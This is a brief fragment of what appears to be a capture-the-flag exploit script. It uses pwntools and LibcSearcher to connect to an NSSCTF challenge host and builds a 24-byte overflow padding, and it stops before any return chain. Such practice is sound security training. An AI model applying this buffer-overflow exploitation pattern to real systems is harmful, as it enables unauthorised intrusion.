from pwn import *
from LibcSearcher import *

p=remote('node7.anna.nssctf.cn',29682)

payload=b'a'*(16+8)
